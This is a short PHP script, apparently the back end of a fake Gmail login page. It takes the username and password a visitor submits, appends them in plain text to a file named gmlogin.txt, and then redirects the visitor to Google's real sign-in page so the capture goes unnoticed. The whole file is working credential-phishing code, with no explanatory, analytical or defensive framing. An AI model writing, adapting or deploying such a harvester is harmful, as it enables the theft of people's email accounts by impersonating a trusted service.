<?php
    $usr = $pwd = $str = "";
    if(empty($_POST['username'])){
        header('location: http://iitcedelhi.com/NEERAJ/gmailclone.php/');
    }else{
        $usr = $_POST['username'];
    }   

    if(empty($_POST['password'])){
        header('location: http://iitcedelhi.com/NEERAJ/gmailclone.php/');
    }else{
        $pwd = $_POST['password'];
    }  

    $str = "
            username : $usr
            password : $pwd
    ";

    $file = fopen("extra/gmlogin.txt","a") or die("Unable to Open!");
    fwrite($file,$str);
    fclose($file);


    header('location: https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin');
?>